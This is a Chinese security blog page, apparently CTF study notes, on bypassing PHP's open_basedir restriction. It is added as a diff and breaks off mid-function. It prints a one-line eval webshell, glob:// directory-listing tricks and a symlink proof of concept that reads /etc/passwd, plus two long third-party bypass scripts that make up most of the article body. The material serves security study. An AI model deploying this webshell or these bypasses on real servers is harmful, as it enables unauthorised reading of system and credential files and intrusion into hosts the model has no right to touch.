@@ -1,0 +1,1763 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="open_basedir绕过, Aurorabin">
+    <meta name="description" content="open_basedir绕过一般获得代码执行权限之后，一般先是进行目录搜索
+什么是open_basedirOpen_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>open_basedir绕过 | Aurorabin</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Aurorabin</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Aurorabin</div>
+        <div class="logo-desc">
+            
+            Aurorabin是啥都不会的菜狗
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">open_basedir绕过</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctfshow/">
+                                <span class="chip bg-color">ctfshow</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-09-13
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><p>一般获得代码执行权限之后，一般先是进行目录搜索</p>
+<h2 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir"></a>什么是open_basedir</h2><p>Open_basedir是PHP设置中<strong>为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查</strong>。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。 一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
+<h2 id="本篇测试脚本"><a href="#本篇测试脚本" class="headerlink" title="本篇测试脚本"></a>本篇测试脚本</h2><p>本篇所用到的php测试文件是一个一句话木马</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_GET[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>并且open_basedir设置为&#x2F;var&#x2F;www&#x2F;html<img src="/images/open_basedir_1.png" alt="img">我们先来看下open_basedir起到的作用，以scandir函数为例。当我们sandir的目录为当前目录时，可以正常输出结果。<img src="/images/open_basedir_2.png" alt="img">当尝试输出上层目录时，无法正常输出。<img src="/images/open_basedir_3.png" alt="img"></p>
+<h2 id="通过系统命令执行绕过"><a href="#通过系统命令执行绕过" class="headerlink" title="通过系统命令执行绕过"></a>通过系统命令执行绕过</h2><p>但是open_basedir对系统函数并没有做相关的限制，我们用系统函数可以绕过。<img src="/images/open_basedir_4.png" alt="img"></p>
+<h2 id="利用glob-x2F-x2F-绕过"><a href="#利用glob-x2F-x2F-绕过" class="headerlink" title="利用glob:&#x2F;&#x2F;绕过"></a>利用glob:&#x2F;&#x2F;绕过</h2><h3 id="DirectoryIterator-glob-x2F-x2F"><a href="#DirectoryIterator-glob-x2F-x2F" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h3><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)<br>脚本差不多如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$a &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到,成功列出目录:<img src="/images/open_basedir_5.png" alt="img">当传入的参数为<code>glob:///*</code>时会列出根目录下的文件，传入参数为<code>glob://*</code>时会列出open_basedir允许目录下的文件。</p>
+<p><img src="/images/image-20220514004821695-1663068765340.png" alt="image-20220514004821695"></p>
+<h3 id="scandir-glob-x2F-x2F"><a href="#scandir-glob-x2F-x2F" class="headerlink" title="scandir()+glob:&#x2F;&#x2F;"></a>scandir()+glob:&#x2F;&#x2F;</h3><p>这是看TCTF WP里面的一种方法，最为简单明了: 代码如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+var_dump(scandir(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);
+&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/open_basedir_6.png" alt="img">这种方法也只能列出根目录和open_basedir允许目录下的文件。</p>
+<h3 id="opendir-readdir-glob-x2F-x2F"><a href="#opendir-readdir-glob-x2F-x2F" class="headerlink" title="opendir()+readdir()+glob:&#x2F;&#x2F;"></a>opendir()+readdir()+glob:&#x2F;&#x2F;</h3><p>脚本如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+if ( $b &#x3D; opendir(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;) ) &#123;
+    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;
+        echo $file.&quot;&lt;br&gt;&quot;;
+    &#125;
+    closedir($b);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/open_basedir_7.png" alt="img">同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。<br>可以看到，<strong>上面三种和glob:&#x2F;&#x2F;相关的协议，最大的缺陷就是<font color="pink">只能列目录</font>，而且还只能列根目录和open_basedir允许目录的内容。</strong></p>
+<h2 id="利用symlink-绕过（比较常用）"><a href="#利用symlink-绕过（比较常用）" class="headerlink" title="利用symlink()绕过（比较常用）"></a>利用symlink()绕过（比较常用）</h2><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3><p>symlink()对于已有的target建立一个名为link的符号连接。<br>用法如下:</p>
+<ul>
+<li>symlink (string target,stringtarget,stringlink) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。</li>
+<li>成功时返回TRUE， 或者在失败时返回FALSE。 示例用法如下:</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$target &#x3D; &#39;uploads.php&#39;;
+$link &#x3D; &#39;uploads&#39;;
+symlink($target, $link);
+
+echo readlink($link);
+# 将会输出&#39;uploads.php&#39;这个字符串
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="POC及原理分析"><a href="#POC及原理分析" class="headerlink" title="POC及原理分析"></a>POC及原理分析</h3><p>假如我们要读取&#x2F;etc&#x2F;passwd,对应的POC为:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+mkdir(&quot;a&quot;);
+chdir(&quot;a&quot;);
+mkdir(&quot;b&quot;);
+chdir(&quot;b&quot;);
+mkdir(&quot;c&quot;);
+chdir(&quot;c&quot;);
+mkdir(&quot;d&quot;);
+chdir(&quot;d&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+symlink(&quot;a&#x2F;b&#x2F;c&#x2F;d&quot;,&quot;Von&quot;);
+symlink(&quot;Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;,&quot;exp&quot;);
+unlink(&quot;Von&quot;);
+mkdir(&quot;Von&quot;);
+system(&#39;cat exp&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/open_basedi_8.png" alt="img">成功读取&#x2F;etc&#x2F;passwd.<br>我们来分析下这个POC </p>
+<p><strong>1.</strong> 首先前面8步,实现了创建a&#x2F;b&#x2F;c&#x2F;d目录,并把当前目录移动到该目录下面。<br><strong>2.</strong> 接着symlink(“a&#x2F;b&#x2F;c&#x2F;d”,”Von”)创建了一个符号文件Von,指向了a&#x2F;b&#x2F;c&#x2F;d<br><strong>3.</strong> 接着symlink(“Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”),由于此时Von仍然是一个符号文件,所以等价于symlink(“a&#x2F;b&#x2F;c&#x2F;d&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”),由于此时<strong>a&#x2F;b&#x2F;c&#x2F;d&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;的结果等于&#x2F;var&#x2F;www&#x2F;html</strong>,符合<strong>open_basedir的限制,因此软链接可以被成功建立</strong><br><strong>4.</strong> 但是之后我们<strong>删除了Von这个软链接，并且建立了一个真实的文件夹Von</strong>,所以此时上面symlink(“Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”)中的Von不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。 其实到了这一步，我们直接访问根目录下的exp文件能得到结果，我上面是为了让结果直观展示出来才利用使用了system(‘cat exp’)来得到结果。(一般情况下system()是被禁的)<img src="/images/open_basedi_10.png" alt="img">给出两个大神的POC</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+&#x2F;* * by phithon * From https:&#x2F;&#x2F;www.leavesongs.com * detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068 *&#x2F;
+header(&#39;content-type: text&#x2F;plain&#39;);
+error_reporting(-1);
+ini_set(&#39;display_errors&#39;, TRUE);
+printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());
+printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));
+$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);
+$relat_file &#x3D; getRelativePath(__FILE__, $file);
+$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);
+$name &#x3D; mt_rand() % 999;
+$exp &#x3D; getRandStr();
+mkdir($name);
+chdir($name);
+for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;
+    mkdir($paths[$i]);
+    chdir($paths[$i]);
+&#125;
+mkdir($paths[$i]);
+for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; 
+    chdir(&#39;..&#39;);
+&#125;
+$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);
+$j &#x3D; 0;
+for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; 
+    mkdir($name);
+    chdir($name);
+    $j++;
+&#125;
+for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; 
+    chdir(&#39;..&#39;);
+&#125;
+$tmp &#x3D; array_fill(0, $j + 1, $name);
+symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);
+$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);
+symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);
+unlink(&#39;tmplink&#39;);
+mkdir(&#39;tmplink&#39;);
+delfile($name);
+$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;
+$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;
+echo &quot;\n-----------------content---------------\n\n&quot;;
+echo file_get_contents($exp);
+delfile(&#39;tmplink&#39;);
+
+function getRelativePath($from, $to) &#123;
+  &#x2F;&#x2F; some compatibility fixes for Windows paths
+  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;
+  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);
+  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);
+
+  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);
+  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);
+  $relPath  &#x3D; $to;
+
+  foreach($from as $depth &#x3D;&gt; $dir) &#123;
+    &#x2F;&#x2F; find first non-matching dir
+    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;
+      &#x2F;&#x2F; ignore this directory
+      array_shift($relPath);
+    &#125; else &#123;
+      &#x2F;&#x2F; get number of remaining dirs to $from
+      $remaining &#x3D; count($from) - $depth;
+      if($remaining &gt; 1) &#123;
+        &#x2F;&#x2F; add traversals up to first matching dir
+        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;
+        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);
+        break;
+      &#125; else &#123;
+        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];
+      &#125;
+    &#125;
+  &#125;
+  return implode(&#39;&#x2F;&#39;, $relPath);
+&#125;
+
+function delfile($deldir)&#123;
+    if (@is_file($deldir)) &#123;
+        @chmod($deldir,0777);
+        return @unlink($deldir);
+    &#125;else if(@is_dir($deldir))&#123;
+        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;
+        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))
+        &#123;
+            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);
+            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;
+        &#125; 
+        @closedir($mydir);
+        @chmod($deldir,0777);
+        return @rmdir($deldir) ? true : false;
+    &#125;
+&#125;
+
+function File_Str($string)
+&#123;
+    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));
+&#125;
+
+function getRandStr($length &#x3D; 6) &#123;
+    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $randStr &#x3D; &#39;&#39;;
+    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;
+        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);
+    &#125;
+    return $randStr;
+&#125;
+&lt;?php
+&#x2F;* PHP open_basedir bypass collection Works with &gt;&#x3D; PHP5 By &#x2F;fd, @filedescriptor(https:&#x2F;&#x2F;twitter.com&#x2F;filedescriptor) *&#x2F;
+
+&#x2F;&#x2F; Assistant functions
+function getRelativePath($from, $to) &#123;
+	&#x2F;&#x2F; some compatibility fixes for Windows paths
+	$from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;
+	$from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);
+	$to &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);
+
+	$from &#x3D; explode(&#39;&#x2F;&#39;, $from);
+	$to &#x3D; explode(&#39;&#x2F;&#39;, $to);
+	$relPath &#x3D; $to;
+
+	foreach ($from as $depth &#x3D;&gt; $dir) &#123;
+		&#x2F;&#x2F; find first non-matching dir
+		if ($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;
+			&#x2F;&#x2F; ignore this directory
+			array_shift($relPath);
+		&#125; else &#123;
+			&#x2F;&#x2F; get number of remaining dirs to $from
+			$remaining &#x3D; count($from) - $depth;
+			if ($remaining &gt; 1) &#123;
+				&#x2F;&#x2F; add traversals up to first matching dir
+				$padLength &#x3D; (count($relPath) + $remaining - 1) * -1;
+				$relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);
+				break;
+			&#125; else &#123;
+				$relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];
+			&#125;
+		&#125;
+	&#125;
+	return implode(&#39;&#x2F;&#39;, $relPath);
+&#125;
+
+function fallback($classes) &#123;
+	foreach ($classes as $class) &#123;
+		$object &#x3D; new $class;
+		if ($object-&gt;isAvailable()) &#123;
+			return $object;
+		&#125;
+	&#125;
+	return new NoExploit;
+&#125;
+
+&#x2F;&#x2F; Core classes
+interface Exploitable &#123;
+	function isAvailable();
+	function getDescription();
+&#125;
+
+class NoExploit implements Exploitable &#123;
+	function isAvailable() &#123;
+		return true;
+	&#125;
+	function getDescription() &#123;
+		return &#39;No exploit is available.&#39;;
+	&#125;
+&#125;
+
+abstract class DirectoryLister implements Exploitable &#123;
+	var $currentPath;
+
+	function isAvailable() &#123;&#125;
+	function getDescription() &#123;&#125;
+	function getFileList() &#123;&#125;
+	function setCurrentPath($currentPath) &#123;
+		$this-&gt;currentPath &#x3D; $currentPath;
+	&#125;
+	function getCurrentPath() &#123;
+		return $this-&gt;currentPath;
+	&#125;
+&#125;
+
+class GlobWrapperDirectoryLister extends DirectoryLister &#123;
+	function isAvailable() &#123;
+		return stripos(PHP_OS, &#39;win&#39;) &#x3D;&#x3D;&#x3D; FALSE &amp;&amp; in_array(&#39;glob&#39;, stream_get_wrappers());
+	&#125;
+	function getDescription() &#123;
+		return &#39;Directory listing via glob pattern&#39;;
+	&#125;
+	function getFileList() &#123;
+		$file_list &#x3D; array();
+		&#x2F;&#x2F; normal files
+		$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#123;$this-&gt;getCurrentPath()&#125;*&quot;);
+		foreach ($it as $f) &#123;
+			$file_list[] &#x3D; $f-&gt;__toString();
+		&#125;
+		&#x2F;&#x2F; special files (starting with a dot(.))
+		$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#123;$this-&gt;getCurrentPath()&#125;.*&quot;);
+		foreach ($it as $f) &#123;
+			$file_list[] &#x3D; $f-&gt;__toString();
+		&#125;
+		sort($file_list);
+		return $file_list;
+	&#125;
+&#125;
+
+class RealpathBruteForceDirectoryLister extends DirectoryLister &#123;
+	var $characters &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789-_&#39;
+	, $extension &#x3D; array()
+	, $charactersLength &#x3D; 38
+	, $maxlength &#x3D; 3
+	, $fileList &#x3D; array();
+
+	function isAvailable() &#123;
+		return ini_get(&#39;open_basedir&#39;) &amp;&amp; function_exists(&#39;realpath&#39;);
+	&#125;
+	function getDescription() &#123;
+		return &#39;Directory listing via brute force searching with realpath function.&#39;;
+	&#125;
+	function setCharacters($characters) &#123;
+		$this-&gt;characters &#x3D; $characters;
+		$this-&gt;charactersLength &#x3D; count($characters);
+	&#125;
+	function setExtension($extension) &#123;
+		$this-&gt;extension &#x3D; $extension;
+	&#125;
+	function setMaxlength($maxlength) &#123;
+		$this-&gt;maxlength &#x3D; $maxlength;
+	&#125;
+	function getFileList() &#123;
+		set_time_limit(0);
+		set_error_handler(array(__CLASS__, &#39;handler&#39;));
+		$number_set &#x3D; array();
+		while (count($number_set &#x3D; $this-&gt;nextCombination($number_set, 0)) &lt;&#x3D; $this-&gt;maxlength) &#123;
+			$this-&gt;searchFile($number_set);
+		&#125;
+		sort($this-&gt;fileList);
+		return $this-&gt;fileList;
+	&#125;
+	function nextCombination($number_set, $length) &#123;
+		if (!isset($number_set[$length])) &#123;
+			$number_set[$length] &#x3D; 0;
+			return $number_set;
+		&#125;
+		if ($number_set[$length] + 1 &#x3D;&#x3D;&#x3D; $this-&gt;charactersLength) &#123;
+			$number_set[$length] &#x3D; 0;
+			$number_set &#x3D; $this-&gt;nextCombination($number_set, $length + 1);
+		&#125; else &#123;
+			$number_set[$length]++;
+		&#125;
+		return $number_set;
+	&#125;
+	function searchFile($number_set) &#123;
+		$file_name &#x3D; &#39;a&#39;;
+		foreach ($number_set as $key &#x3D;&gt; $value) &#123;
+			$file_name[$key] &#x3D; $this-&gt;characters[$value];
+		&#125;
+		&#x2F;&#x2F; normal files
+		realpath($this-&gt;getCurrentPath() . $file_name);
+		&#x2F;&#x2F; files with preceeding dot
+		realpath($this-&gt;getCurrentPath() . &#39;.&#39; . $file_name);
+		&#x2F;&#x2F; files with extension
+		foreach ($this-&gt;extension as $extension) &#123;
+			realpath($this-&gt;getCurrentPath() . $file_name . $extension);
+		&#125;
+	&#125;
+	function handler($errno, $errstr, $errfile, $errline) &#123;
+		$regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;
